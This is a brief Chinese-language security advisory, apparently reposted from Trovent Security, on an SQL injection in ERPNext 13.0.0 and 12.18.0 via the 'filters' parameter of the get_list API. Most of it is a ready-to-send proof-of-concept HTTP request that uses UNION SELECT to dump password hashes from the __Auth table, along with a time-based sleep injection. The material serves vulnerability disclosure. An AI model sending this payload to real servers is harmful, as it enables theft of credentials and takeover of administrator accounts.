# ERPNext 13.0.0/12.18.0 中的SQL注入漏洞


Trovent Security GmbH 在“frappe.model.db_query.get_list”API参数中发现了一个SQL注入漏洞。在13.0.0版本上，不需要任何特权的Payload就足够了，但是在12.18.0版本上，至少需要“system_user”特权。易受攻击的参数“filters”允许注入SQL语句。攻击者能够查询所有可用的数据库表，以检索用户名，密码哈希或密码重置令牌，然后可以使用这些密码来重置管理员密码。

poc：

```
GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a
%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20'%3b%20do%20sleep(10)&order_by=name&_=1615372773071 HTTP/1.1
Host: erpnext.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bcf3
X-Frappe-CMD:
X-Frappe-Doctype: Dashboard%20Settings
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://erpnext.local/app/website
Cookie: io=NVosyhHCvV3KdkxNAAi7; sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; system_user=no; full_name=auth%20test%27; user_id=auth%40trovent.io; user_image=
```

ref：

1. https://trovent.io/security-advisory-2103-01
2. https://seclists.org/oss-sec/2021/q2/121
